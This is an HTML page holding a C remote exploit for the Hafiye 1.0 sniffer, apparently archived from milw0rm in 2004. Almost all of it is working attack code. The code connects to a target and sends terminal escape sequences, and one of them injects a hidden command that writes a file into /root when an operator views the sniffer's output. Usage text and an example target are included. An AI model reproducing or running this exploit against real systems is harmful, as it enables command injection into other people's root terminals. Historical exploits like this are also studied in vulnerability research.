<html><head><title>Hafiye 1.0 Remote Terminal Escape Sequence Injection Vulnerability</title></head><pre>/* Remote Exploit for Hafiye-1.0
** Terminal Escape Sequence Injection Vulnerability
** Written by Serkan Akpolat
** Homepage: http://deicide.siyahsapka.org
** E-mail: deicide siyahsapka org
** Greets: Virulent, gorny and all other netricians
*/
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdlib.h&gt;

typedef struct _target {
char *host;
u_short port;
unsigned int sequence;
unsigned int cnt;
} target;

char *esc_sequence[]= {&quot;Escape Sequences&quot;,
&quot;\x1b&quot;&quot;]2;Insecure?&quot;&quot;\x07\x0a&quot;,
&quot;\x07\x07\x07\x07\x07\x07&quot;,
&quot;\x1b&quot;&quot;]2;;echo Owned &gt; /root/Owned.txt&quot;
&quot;\x07\x1b&quot;&quot;[21t&quot;&quot;\x1b&quot;&quot;]2;xterm&quot;&quot;\x07&quot;
&quot;Abnormal Termination&quot;&quot;\x1b&quot;
&quot;[8m;&quot;&quot;\x0a&quot;};


char use[] =&quot;\t[ -h host ] [ -p port ] [ -e esc-seq-n ] [ -l number ]\n&quot;
&quot;\t Escape Sequences :\n&quot;
&quot;\t1-Change TitleBar Text to \&quot;Insecure?\&quot;\n&quot;
&quot;\t2-Ring The Bell\n&quot;
&quot;\t3-Hidden Prompt to Create Owned.txt in /root\n&quot;
&quot;\tExample: ./exp -h 192.168.0.3 -p 80 -e 1 -l 1\n&quot;;

void usage()
{
printf(&quot;%s&quot;,use);
exit(1);
}

int connect_to_host(char *host, u_short port)
{
int sock = 0;
struct hostent *hp;
struct sockaddr_in sa;

memset(&amp;sa, 0, sizeof(sa));

hp = gethostbyname(host);
if (hp == NULL) {
herror(&quot;Error:&quot;);
exit(1);
}
sa.sin_family = AF_INET;
sa.sin_port = htons(port);
sa.sin_addr = **((struct in_addr **) hp-&gt;h_addr_list);

sock = socket(AF_INET, SOCK_STREAM, 0);
if (sock &lt; 0)
exit(1);

if (connect(sock, (struct sockaddr *) &amp;sa, sizeof(sa)) &lt; 0)
exit(1);

printf(&quot;[+] Connected to %s\n&quot;, host);
return sock;
}

int main(int argc, char **argv)
{
int i;
int sock = 0;
char buf[256]=&quot;\0&quot;;
target target;
memset(&amp;target,0,sizeof(target));
while ((i = getopt(argc, argv, &quot;h:p:e:l:&quot;)) != -1) {
switch (i) {
case 'h':
target.host = optarg;
break;
case 'p':
target.port = (u_short)atoi(optarg);
break;
case 'e':
target.sequence = atoi(optarg);
if(target.sequence &lt; 1 || target.sequence &gt; 3) {
usage();
}
break;
case 'l':
target.cnt=atoi(optarg);
if(target.cnt&lt;1) {
target.cnt=1;
}
break;
case ':':
case '?':
default:
usage();
exit(1);
}
}
if (optind != argc || !target.host || !target.port ||
!target.sequence || !target.cnt) {
usage();
}

sock = connect_to_host(target.host, target.port);
strncpy(buf,esc_sequence[target.sequence],sizeof(buf)-1);


printf(&quot;[+] Sending Escape Sequences\n&quot;);
do {
if (send(sock, buf, strlen(buf), 0) &lt; 0) {
printf(&quot;Socket Error\n&quot;);
exit(1);
}
target.cnt--;
} while(target.cnt &gt; 0);
close(sock);
return 0;
}

// milw0rm.com [2004-08-25]</pre></html>